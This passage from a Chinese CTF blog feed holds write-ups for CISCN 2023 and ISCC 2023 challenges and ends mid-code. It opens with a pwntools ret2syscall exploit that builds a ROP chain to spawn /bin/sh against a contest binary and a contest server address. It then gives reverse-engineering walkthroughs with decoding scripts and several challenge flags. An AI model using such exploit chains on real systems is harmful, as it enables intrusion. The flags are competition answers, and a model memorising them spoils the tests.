class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>pop_rax_addr <span class="token operator">=</span> <span class="token number">0x458827</span>syscall_addr <span class="token operator">=</span> <span class="token number">0x402404</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果三"><a href="#结果三" class="headerlink" title="结果三"></a>结果三</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF24.png" alt="CISCN2023-烧烤摊儿24.png"></p>]]></content>
    
    
    <summary type="html">第十六届 CISCN 国赛初赛的一道题，难度不算大，主要是利用 scanf 输入的溢出来 get shell，方法很多，赛后根据这道题总结了三种方法：ret2shellcode（mprotect 修改权限）、ORW、ret2syscall</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】Pull the Wool Over People&#39;s Eyes</title>
    <link href="https://www.4ss1du0us.cn/2023/069f2898f.html"/>
    <id>https://www.4ss1du0us.cn/2023/069f2898f.html</id>
    <published>2023-06-09T07:29:24.000Z</published>
    <updated>2023-06-29T10:47:54.630Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>使用 OllyDBG 动态调试直接获取程序的中间数据</p></li><li><p>分析伪代码函数逻辑</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Pull the Wool Over People’s Eyes</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes1.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes1.png"><br>代码比较长，先定位到输入的位置<br><code>sub_402190(std::cin, v35)</code> 让用户输入 <code>v35</code><br><code>sub_401650(Src, v22, v25)</code> 用于生成一个 <code>Src</code>，后面会用到<br>生成 <code>Src</code> 的逻辑如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes2.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes2.png"></p></li><li><p>虽然给出了生成 <code>Src</code> 的代码，但是这里可以通过 OllyDBG 动态调试直接得到 <code>Src</code> 的内容，在 <code>sub_401650()</code> 函数的返回值处，下一个断点即可<br>先找到 <code>return Src;</code> 这句的地址，在这一条指令处使用快捷键 <code>TAB</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes3.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes3.png"><br>在 OllyDBG 中打开，定位到该位置，在 IDA 中该地址为 <code>0x004017DB</code>，在 OllyDBG 中为 <code>0x000E17DB</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes4.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes4.png"><br><code>F2</code> 下断点<br>直接运行程序，输入的时候随便输入即可<br>在堆栈窗口中即可看到生成的 <code>Src</code> 的值为：<code>ISCC&#123;ACYeeeloorrsuv&#125;</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes5.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes5.png"></p></li><li><p>跟踪 <code>Src</code> 和 <code>v35</code> 的处理过程，观察到如下代码：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes6.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes6.png"><br>首先将输入 <code>v35</code> 赋值给 <code>v4</code>，<code>Src</code> 赋值给 <code>v5</code><br>其中，<code>v3</code> 为 <code>v35</code> 和 <code>Src</code> 的索引，<code>v29</code> 为 <code>v6</code> 的索引<br><code>v7 = v4 + v3</code> 指向 <code>v35</code><br><code>v8 = v5 + v3</code> 指向 <code>Src</code><br><code>v6</code> 指向 <code>v35</code><br><code>*(v6 + v29) = *v8 ^ *v7</code> 将 <code>v35</code> 和 <code>Src</code> 进行异或，即 <code>v35[] = Src[] ^ v35[]</code></p></li><li><p>后面定义了一串 0 和 1 的字符串 <code>v10</code>，并用一个 while() 循环比较 <code>v9[]</code> 和 <code>v10[]</code> 的值是否相等<br>若每一位都相等，则 <code>v13 = 0</code>，输出 Right<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes7.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes7.png"><br>由初值 <code>v11 = 156</code>，<code>v14 = v11 &lt; 4</code>，当 <code>v11 &lt; 4</code> 时结束循环<br>结合 <code>Src = ISCC&#123;ACYeeeloorrsuv&#125;</code> 长度为 20<br><code>v10</code> 长度为 160，每 8 位二进制作为一组与 <code>Src</code> 进行异或<br>即可得到 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"ISCC&#123;ACYeeeloorrsuv&#125;"</span>  v10 <span class="token operator">=</span> <span class="token string">"0000000000000000000000000000000000000000011001000111001000101110001001110001010100000001000111110101110100101100000111010100101100100100010000010010000000000000"</span>  num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          t <span class="token operator">+=</span> v10<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span>      num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC</p></blockquote>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，逻辑不算难，需要读懂伪代码逻辑，主要是耐心，对于程序生成的中间数据可以直接通过 OllyDBG 动态调试获得</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】Convert</title>
    <link href="https://www.4ss1du0us.cn/2023/06f43ef1b7.html"/>
    <id>https://www.4ss1du0us.cn/2023/06f43ef1b7.html</id>
    <published>2023-06-09T02:08:24.000Z</published>
    <updated>2023-06-30T01:42:02.274Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>逆向代码逻辑</p></li><li><p><mark>注意 IDA 伪代码中有一些数据的一部分会用其他变量来表示，记得拼接</mark></p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Convert</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Convert1.png" alt="ISCC2023-Convert1.png"><br>分析可知<br><code>sub_4865AD(&amp;unk_5DC488, &amp;byte_5A04DC)</code> 为 <code>printf(&quot;请输入flag：\n&quot;)</code><br><code>sub_484D2F(&amp;dword_5DC3E0, v5)</code> 为 <code>scanf(&quot;%s&quot;, v5)</code><br>逻辑比较简单，就是将输入 <code>v5</code> 进行处理后与 <code>v8</code> 进行比较，如果相同则获得 flag</p></li><li><p>主要的处理逻辑在 <code>sub_488B0A(v5, v7, v6)</code> 中，<code>sub_488B0A(v5, v7, v6)</code> 会调用 <code>sub_499080(a1, a2, a3)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Convert2.png" alt="ISCC2023-Convert2.png"><br>这里的逻辑也不复杂，直接将这个算法逆过来即可</p></li><li><p>注意伪代码中的 <code>v9</code>，其实也是密文的一部分<br>完整的密文内容为 <code>v8</code> 和 <code>v9</code></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10Ch] [ebp-30h] BYREF  </span>    <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+118h] [ebp-24h] BYREF  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'('</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'0'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'b'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">85</span><span class="token punctuation">;</span>        v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'B'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'D'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'W'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'G'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\''</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token char">'5'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">':'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'s'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token string">"ISCC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">12</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v8<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span> <span class="token operator">*</span> j<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-=</span> j <span class="token operator">^</span> <span class="token operator">-</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> v6 <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> i<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC{1!&amp;&amp;?7!]&lt;MYI&amp;+*AE}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Convert3.png" alt="ISCC2023-Convert3.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，这个题比较简单，主要是对代码逻辑的逆向，但是要注意有些数据不要掉了，IDA 伪代码中有一些数据的一部分会用其他变量来表示</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】变形记</title>
    <link href="https://www.4ss1du0us.cn/2023/0638e84743.html"/>
    <id>https://www.4ss1du0us.cn/2023/0638e84743.html</id>
    <published>2023-06-08T01:23:24.000Z</published>
    <updated>2023-06-30T01:41:44.412Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>熟悉伪代码中 Base64 算法的不同实现方法</mark></p></li><li><p>熟悉一些逆向的代码逻辑</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】变形记</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B01.png" alt="ISCC2023-变形记1.png"><br>查看字符串：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B02.png" alt="ISCC2023-变形记2.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B03.png" alt="ISCC2023-变形记3.png"><br>发现形似 Base64 加密的字符串和 Base64 加密的码表</p></li><li><p>跟进码表位置：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B04.png" alt="ISCC2023-变形记4.png"><br>这里先将 Base64 码表 <code>BASE64_table_404200</code> 赋值给了 <code>v6</code> 和 <code>v56</code><br>由于每一步 <code>if else</code> 都会执行 <code>sub_401960()</code> 函数，跟进：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B05.png" alt="ISCC2023-变形记5.png"><br>该函数的作用是在堆上分配一段新的内存空间，并将原始数据从源地址复制到新分配的内存中<br>即：该函数可用于扩展内存空间并复制数据</p></li><li><p>根据 <code>sub_401180()</code> 代码中的替换规则：</p></li></ol><table><thead><tr><th align="left">步骤</th><th align="left">代码</th></tr></thead><tbody><tr><td align="left">一：第一个字符右移 2 位，取前 6 位作为索引值，查找对应字符</td><td align="left"><code>v10 = v6[*(v7 - 2) &gt;&gt; 2]</code><br><code>sub_401960(Src, v8, v48, v10)</code><br></td></tr><tr><td align="left">二：第一个字符取后 2 位与第二个字符的前 4 位拼接，查找对应字符</td><td align="left"><code>v13 = 16 * (*(v7 - 2) &amp; 3)</code><br><code>v31 = v56[v13]</code><br><code>sub_401960(Src, v32, v42, v31)</code><br><br><code>v14 = v56[v13 + (*(v7 - 1) &gt;&gt; 4)]</code><br><code>sub_401960(Src, v15, v47, v14)</code><br></td></tr><tr><td align="left">三：第二个字符取后 4 位与第三个字符的前 2 位拼接，查找对应字符</td><td align="left"><code>v18 = 4 * (*(v7 - 1) &amp; 0xF)</code><br><code>v26 = v56[v18]</code><br><code>sub_401960(Src, v27, v44, v26)</code><br><br><code>v19 = v56[v18 + (*v7 &gt;&gt; 6)]</code><br><code>sub_401960(Src, v20, v46, v19)</code><br></td></tr><tr><td align="left">四：第三个字符取后 6 位作为索引，查找对应字符</td><td align="left"><code>v23 = v56[*v7 &amp; 0x3F]</code><br><code>sub_401960(Src, v24, v45, v56[*v7 &amp; 0x3F])</code><br></td></tr></tbody></table><p>符合 Base64 加密的算法逻辑<br>所以 <code>sub_401180()</code> 函数其实就是 <code>Base64Encode()</code><br>即：主函数中 <code>sub_4014C0(v39, Block, v17, v32)</code> 进行的是 Base64 加密</p><ol start="4"><li><p>分析可知 <code>sub_401820()</code> 为 <code>strcpy()</code> 函数<br>存在 Base64 的字符串：<code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code><br>后面这一段代码进行了字符串的反转：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B06.png" alt="ISCC2023-变形记6.png"><br><code>v37[]</code> 存储的是 <code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code>，<code>v49[]</code> 是一个新的数组，<code>v18</code> 为 <code>v37[]</code> 的长度，<code>v20</code> 为索引位置，<code>v49[v20 - 2] = *(v22 + v18 - v20 - 1)</code> 将 <code>v37[]</code> 反向复制到 <code>v49[]</code></p></li><li><p>于是使用 <a href="http://gv99.com/text/string2reverse.html">在线字符串反转</a> 反向并进行 Base64 解密发现解密成功：<code>zBzya2VzVcyavQcQzsBz</code><br>但是 <code>ISCC&#123;zBzya2VzVcyavQcQzsBz&#125;</code> 结果不对</p></li><li><p>发现在前面还有一段代码：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B07.png" alt="ISCC2023-变形记7.png"></p></li></ol><p>其中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v13 <span class="token operator">=</span> v37<span class="token punctuation">;</span>        v14 <span class="token operator">=</span> v37<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>          v13 <span class="token operator">=</span> v9<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> v9<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v14 <span class="token operator">+</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v12<span class="token 